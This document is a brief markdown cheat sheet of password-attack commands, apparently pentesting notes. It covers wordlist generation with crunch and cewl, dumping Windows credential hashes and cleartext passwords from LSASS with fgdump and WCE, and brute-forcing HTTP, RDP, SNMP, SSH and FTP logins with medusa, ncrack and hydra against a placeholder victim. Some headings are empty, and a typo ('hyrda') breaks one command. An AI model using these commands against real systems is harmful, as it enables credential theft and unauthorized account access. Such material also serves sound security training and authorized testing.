## Password file generator

### crunch
##### crunch 6 6 1234567890ABCDE -o <file.txt>
  - ***6*** min length
  - ***6*** max length
  - ***1234567890ABCDE*** charset
  - ***o*** seve result in file
 
 #### crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha
  - ***f*** dictionary path
  
 #### special chars
  - @ lower case alpha char
  - , upper case alpha char
  - % numeric charset
  - ^ special char include space
  
### pwdump fgdump
MS Windows store hased user password in the ***Security account manager (SAM)***
pwdump and fgdump inject a DLL containning the hash dumping code into the ***Local Security Authority Subsystem (LSASS)***

***- c:\> fgdump.exe ***
***- c:\> type 127.0.0.1.pwdump ***

### WCE
WCE can steal NTLM credentails from memory and dump clear text password
***- c:\> WCE -w ***

### Password Profiling
##### cewl
  ***cewl <victim_www_url> -d [num] -m [num] -w [file.txt]***
  
### Online password attacks

#### HTTP Brute force attack
- medusa -h [url] -u [user_name] -p [password_file.txt] -M http

#### RDP Brute force attack
- ncrack -vv --user [user_name] -P [password_file.txt] rdp://[victim_ip]

#### SNMP Brute force attack
- hydra -P [password-file.txt] -v [victim_ip] snmp

#### SSH Brute force attack
- hydra -l [user_name] -P [password_file.txt] [victim_ip] ssh

#### FTP Brute force attack
- hyrda -L [user_file] -p [password] [victim_ip] ftp

### Usefull flag
-vV : verbose mode
-e nsr : login as password or login as password in reversed order etc
-t : threads

### Password Hash Attack
#### Hash identifier
  ***- hash-identifier ***
 usage: hash-identifier

#### John the ripper

### Pass the hash
